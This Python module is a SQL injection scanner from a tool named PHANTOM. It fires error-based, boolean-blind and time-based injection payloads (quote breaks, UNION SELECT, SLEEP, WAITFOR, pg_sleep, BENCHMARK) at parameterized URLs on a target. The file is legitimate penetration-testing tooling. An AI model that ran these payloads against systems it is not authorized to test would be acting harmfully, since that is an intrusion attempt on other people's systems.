"""
PHANTOM — SQL Injection Detection Module

Detection methods:
1. Error-based: inject quotes/syntax errors, look for DB error messages
2. Time-based: inject SLEEP/BENCHMARK payloads, measure response delay
3. Boolean blind: compare responses for true (1=1) vs false (1=2) conditions
"""
from __future__ import annotations

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.target import Target, VulnFinding
from core.findings import Finding, FindingsDB
from core.engine import PhantomEngine
from core.config import PhantomConfig
from utils.http_client import request, Response


class SQLiCheck:
    """SQL Injection detection — error, time, and boolean blind."""

    def __init__(self, engine: PhantomEngine):
        self.engine = engine
        self.target = engine.target

    def run(self):
        """Run all SQLi detection methods against discovered URLs."""
        print("[*] Starting SQL Injection checks...")
        findings = 0

        urls = self._collect_urls()
        if not urls:
            print("  [!] No parameterized URLs found to test")
            return

        for url in urls:
            try:
                if self._test_error_based(url):
                    findings += 1
                    continue
                if self._test_boolean_blind(url):
                    findings += 1
                    continue
                self._test_time_based(url)
            except Exception as e:
                print(f"  [!] SQLi test failed for {url}: {e}")
                continue

        print(f"  [+] SQLi checks complete — {findings} finding(s)")

    # ── URL collection ──────────────────────────────────────────────

    def _collect_urls(self) -> list[str]:
        """Collect URLs with parameters from discovered endpoints."""
        urls = []
        for ep in self.target.directories:
            if "?" in ep and "=" in ep:
                urls.append(ep)

        for ep in self.target.js_endpoints:
            if "?" in ep and "=" in ep:
                urls.append(ep)

        # Generate test URLs for common params on all directories
        common_params = ["id", "page", "cat", "product", "user", "file",
                         "dir", "order", "search", "q", "s", "name"]
        for ep in list(set(self.target.directories + self.target.js_endpoints)):
            clean = ep.split("?")[0]
            for param in common_params:
                test_url = f"{clean}?{param}=1"
                if test_url not in urls:
                    urls.append(test_url)

        return list(set(urls))

    # ── Error-based detection ───────────────────────────────────────

    def _test_error_based(self, url: str) -> bool:
        """Inject SQL syntax errors and look for DB error messages."""
        payloads = [
            "'", "\"", "1'", "1' OR '1'='1", "1' AND 1=1--",
            "' OR 1=1--", "'; SELECT 1;--", "1' UNION SELECT 1--",
            "1)) OR 1=1--", "' OR '1'='1' --",
        ]

        error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySqlException",
            r"Syntax error.*SQL", r"Unclosed quotation mark",
            r"Microsoft OLE DB.*SQL Server", r"ODBC.*SQL Server",
            r"ORA-[0-9]{5}", r"PostgreSQL.*ERROR", r"SQLite.*Error",
            r"SQLSTATE", r"Driver.*SQL", r"Unknown column",
            r"Unknown table", r"pg_", r"mysql_fetch",
        ]

        first_param = self._get_first_param(url)
        if not first_param:
            return False

        base_resp = request(url, timeout=8)
        if not base_resp or base_resp.status == 0:
            return False

        for payload in payloads:
            test_url = self._inject(url, first_param, payload)
            try:
                resp = request(test_url, timeout=10)
                if not resp:
                    continue
                body = resp.body

                for pattern in error_patterns:
                    if re.search(pattern, body, re.I):
                        evidence = body[:300].strip()
                        self.engine.findings.add(Finding(
                            name="SQL Injection (Error-based)",
                            severity="CRITICAL",
                            url=url,
                            param=first_param,
                            payload=payload,
                            evidence=evidence,
                            phase="vuln",
                        ))
                        print(f"  [+] SQLi (error) @ {url} ?{first_param}={payload}")
                        return True
            except Exception:
                continue

        return False

    # ── Boolean blind detection ─────────────────────────────────────

    def _test_boolean_blind(self, url: str) -> bool:
        """Compare true vs false condition responses for differences."""
        first_param = self._get_first_param(url)
        if not first_param:
            return False

        pairs = [
            (f"1' AND '1'='1",  f"1' AND '1'='2"),
            (f"1 AND 1=1",      f"1 AND 1=2"),
            (f"' AND 1=1--",    f"' AND 1=2--"),
            (f"' OR '1'='1",    f"' OR '1'='2"),
        ]

        try:
            base_resp = request(url, timeout=8)
            if not base_resp:
                return False
            base_len = len(base_resp.body)
        except Exception:
            return False

        for true_payload, false_payload in pairs:
            true_url = self._inject(url, first_param, true_payload)
            false_url = self._inject(url, first_param, false_payload)

            try:
                true_resp = request(true_url, timeout=10)
                false_resp = request(false_url, timeout=10)
                if not true_resp or not false_resp:
                    continue

                true_len = len(true_resp.body)
                false_len = len(false_resp.body)
                diff = abs(true_len - false_len)

                if diff > 50 and abs(base_len - true_len) > 20:
                    self.engine.findings.add(Finding(
                        name="SQL Injection (Boolean Blind)",
                        severity="CRITICAL",
                        url=url,
                        param=first_param,
                        payload=f"{true_payload} vs {false_payload}",
                        evidence=f"True: {true_len}B, False: {false_len}B (diff={diff})",
                        phase="vuln",
                    ))
                    print(f"  [+] SQLi (boolean) @ {url}")
                    return True
            except Exception:
                continue

        return False

    # ── Time-based detection ────────────────────────────────────────

    def _test_time_based(self, url: str) -> bool:
        """Inject SLEEP/WAITFOR/pg_sleep and measure response delay."""
        first_param = self._get_first_param(url)
        if not first_param:
            return False

        time_payloads = [
            ("' OR SLEEP(5)--", 5),
            ("' OR sleep(5)--", 5),
            ("; WAITFOR DELAY '0:0:5'--", 5),
            ("' OR pg_sleep(5)--", 5),
            ("' OR BENCHMARK(5000000,MD5(1))--", 4),
        ]

        try:
            t0 = time.time()
            request(url, timeout=15)
            baseline = time.time() - t0
        except Exception:
            baseline = 0.5

        for payload, expected in time_payloads:
            test_url = self._inject(url, first_param, payload)
            try:
                t0 = time.time()
                request(test_url, timeout=expected + 10)
                elapsed = time.time() - t0

                if elapsed >= baseline + expected * 0.7:
                    self.engine.findings.add(Finding(
                        name="SQL Injection (Time-based)",
                        severity="CRITICAL",
                        url=url,
                        param=first_param,
                        payload=payload,
                        evidence=f"Baseline: {baseline:.2f}s, Response: {elapsed:.2f}s",
                        phase="vuln",
                    ))
                    print(f"  [+] SQLi (time) @ {url} — {elapsed:.1f}s")
                    return True
            except Exception:
                continue

        return False

    # ── Helpers ─────────────────────────────────────────────────────

    def _get_first_param(self, url: str) -> str | None:
        """Extract the first query parameter name from a URL."""
        if "?" not in url:
            return None
        qs = url.split("?", 1)[1]
        for part in qs.split("&"):
            if "=" in part:
                return part.split("=")[0]
        return None

    def _inject(self, url: str, param: str, payload: str) -> str:
        """Replace a parameter value with the injection payload."""
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_qs = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_qs))
